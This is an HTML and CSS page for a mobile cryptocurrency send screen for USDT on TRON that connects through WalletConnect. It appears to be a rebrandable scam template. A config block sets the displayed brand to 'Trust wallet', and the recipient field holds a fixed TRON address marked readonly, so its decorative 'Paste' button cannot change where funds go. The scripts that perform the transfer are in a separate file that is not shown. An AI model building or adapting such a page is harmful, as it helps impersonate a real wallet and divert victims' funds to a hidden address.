<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="theme-color" content="#0b1210">
<link rel="icon" href="logo.svg">
<title>NoraPay</title>
<style>

:root{--bg:#ffffff;--card:#f3f5f4;--line:#e2e7e5;--txt:#0b1210;--mut:#6b7c76;--acc:#16c784;--acc2:#0ea56c;--err:#e5484d}

*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{margin:0;background:var(--bg);color:var(--txt);font-family:-apple-system,BlinkMacSystemFont,"Inter",system-ui,sans-serif}
.app{max-width:440px;margin:0 auto;min-height:100dvh;display:flex;flex-direction:column;padding:env(safe-area-inset-top) 18px calc(18px + env(safe-area-inset-bottom))}
header{display:flex;align-items:center;justify-content:space-between;padding:16px 0}
.logo{display:flex;align-items:center;gap:8px;font-weight:700;font-size:17px}

.logo img{height:40px;width:200px;object-fit:contain;object-position:left;display:block}


.chip{background:var(--card);border:1px solid var(--line);border-radius:20px;padding:7px 12px;font-size:13px;color:var(--txt);display:flex;align-items:center;gap:6px;cursor:pointer}
.chip i{width:8px;height:8px;border-radius:50%;background:var(--acc);display:inline-block}
.chip.off{background:var(--acc);color:#04130d;font-weight:700;border-color:var(--acc)}.chip.off i{display:none}
h2{font-size:22px;margin:6px 0 18px}
.lbl{font-size:13px;color:var(--mut);margin:18px 0 8px}
.tok{display:flex;align-items:center;gap:12px;background:var(--card);border:1px solid var(--line);border-radius:14px;padding:12px 14px;width:100%;color:var(--txt);cursor:pointer;text-align:left}
.tokicon{width:38px;height:38px;border-radius:50%;display:grid;place-items:center;font-weight:800;font-size:18px;color:#fff;flex:none}
.tokicon.usdt{background:#26a17b}.tokicon.trx{background:#eb0029}
.tok b{display:block;font-size:15px}.tok small{color:var(--mut);font-size:12px}
.tok .sw{margin-left:auto;color:var(--mut);font-size:12px}
.field{display:flex;align-items:center;background:var(--card);border:1px solid var(--line);border-radius:14px;padding:4px 6px 4px 14px}
.field:focus-within{border-color:var(--acc)}
.field input{flex:1;background:none;border:0;outline:0;color:var(--txt);font-size:16px;padding:12px 0;min-width:0}
.field .act{background:none;border:0;color:var(--acc);font-weight:600;font-size:14px;padding:8px 10px;cursor:pointer}
.field .unit{color:var(--mut);font-size:14px;padding:0 6px}
.sub{display:flex;justify-content:space-between;font-size:12px;color:var(--mut);margin-top:8px}
.errtxt{color:var(--err);font-size:13px;min-height:18px;margin-top:10px}
.spacer{flex:1}
.btn{width:100%;border:0;border-radius:28px;padding:16px;font-size:16px;font-weight:700;background:var(--acc);color:#04130d;cursor:pointer}
.btn:active{background:var(--acc2)}
.btn:disabled{background:#1f2c28;color:#4f625b;cursor:not-allowed}
.btn.ghost{background:var(--card);color:var(--txt);border:1px solid var(--line);margin-top:10px}
.hero{text-align:center;margin:12vh 0 32px}
.hero img{width:76px;height:76px}
.hero h1{font-size:26px;margin:16px 0 6px}.hero p{color:var(--mut);margin:0;font-size:15px}
/* sheet */
.sheet{position:fixed;inset:0;pointer-events:none;z-index:10}
.sheet .bg{position:absolute;inset:0;background:#000a;opacity:0;transition:.25s}
.sheet .panel{position:absolute;left:0;right:0;bottom:0;max-width:440px;margin:0 auto;background:var(--card);border-radius:22px 22px 0 0;padding:10px 20px calc(20px + env(safe-area-inset-bottom));transform:translateY(100%);transition:.3s}
.sheet.open{pointer-events:auto}.sheet.open .bg{opacity:1}.sheet.open .panel{transform:none}
.grab{width:40px;height:4px;border-radius:2px;background:var(--line);margin:0 auto 16px}
.big{text-align:center;font-size:30px;font-weight:800;margin:6px 0 2px}
.bigsub{text-align:center;color:var(--mut);font-size:14px;margin-bottom:20px}
.rows{background:var(--bg);border-radius:14px;padding:4px 14px;margin-bottom:18px}
.r{display:flex;justify-content:space-between;padding:12px 0;font-size:14px;border-bottom:1px solid var(--line)}
.r:last-child{border:0}.r span{color:var(--mut)}
.ok{width:76px;height:76px;border-radius:50%;background:#16c78422;display:grid;place-items:center;margin:0 auto}
.ok svg{width:40px;height:40px}
a.link{display:block;text-align:center;color:var(--acc);margin-top:14px;font-size:14px}
.toast{position:fixed;left:50%;bottom:30px;transform:translate(-50%,40px);opacity:0;background:#1d2a26;color:var(--txt);padding:12px 16px;border-radius:12px;font-size:14px;transition:.25s;max-width:90%;z-index:20}
.toast.show{opacity:1;transform:translate(-50%,0)}.toast.err{background:#3a1616;color:#ffb3b3}
</style>
</head>
<body>
<div class="app">

  <!-- SEND -->
  <section id="sendScreen" style="display:flex;flex:1;flex-direction:column">
    <header>
      <div class="logo"><img class="lg" src="logo.svg" alt=""></div>
      <div class="chip" id="chip"><i></i><span id="chipAddr"></span></div>
    </header>
    <h2>Send</h2>

    <div class="lbl">Asset</div>
    <button class="tok" id="tokBtn">
      <div class="tokicon usdt" id="tokIcon">₮</div>
      <div><b id="tokSym">USDT</b><small id="tokName">Tether USD</small></div>
      <span class="sw">TRC20 · Switch ⇅</span>
    </button>

    <div class="lbl">Recipient address</div>
    <div class="field">
      <input id="to" value="TW2r4khwt4PLscpsRVvwMB7dj23DWw8HBa" readonly autocomplete="off" autocapitalize="off" spellcheck="false">

      <button class="act" id="paste">Paste</button>
    </div>

    <div class="lbl">Amount</div>
    <div class="field">
      <input id="amt" type="number" inputmode="decimal" placeholder="0.00">
      <span class="unit" id="amtUnit">USDT</span>
      <button class="act" id="max">Max</button>
    </div>
    <div class="sub"><span id="fiat"></span><span>Available: <b id="avail">-</b></span></div>
    <div class="errtxt" id="err"></div>

    <div class="spacer"></div>
    <button class="btn" id="next" disabled>Next</button>
  </section>

  <!-- DONE -->
  <section id="doneScreen" style="display:none;flex:1;flex-direction:column">
    <div class="hero">
      <div class="ok"><svg viewBox="0 0 24 24" fill="none" stroke="#16c784" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12l5 5 9-10"/></svg></div>
      <h1>Sent</h1>
      <p><b id="dAmt"></b> to <span id="dTo"></span></p>
      <a class="link" id="dLink" target="_blank">View on Tronscan ↗</a>
    </div>
    <div class="spacer"></div>
    <button class="btn" id="again">Done</button>
  </section>
</div>

<!-- CONFIRM SHEET -->
<div class="sheet" id="sheet">
  <div class="bg" id="sheetBg"></div>
  <div class="panel">
    <div class="grab"></div>
    <div class="big" id="cAmt"></div>
    <div class="bigsub" id="cFiat"></div>
    <div class="rows">
      <div class="r"><span>From</span><b id="cFrom"></b></div>
      <div class="r"><span>To</span><b id="cTo"></b></div>
      <div class="r"><span>Network</span><b>TRON</b></div>
      <div class="r"><span>Network fee</span><b id="cFee"></b></div>
    </div>
    <button class="btn" id="confirm">Confirm</button>
  </div>
</div>

<div class="toast" id="toast"></div>
<!-- ================= CONFIG — edit here ================= -->
<script>
window.NORAPAY_CONFIG = {
  brand: "Trust wallet",                          // app name
  logo: "logo.svg",                          // logo file or image URL
  accent: "#2563eb",                         // main button color
  accentDark: "#1d4ed8",                     // button pressed color
  background: "#ffffff",                     // page background
  card: "#f3f5f4",                           // input/card background
  projectId: "9b0ce1ead8ab25a313e9942a4809a40f" // WalletConnect (Reown) project ID
};
</script>
<!-- ====================================================== -->
<script src="app.js"></script>
</body>
</html>
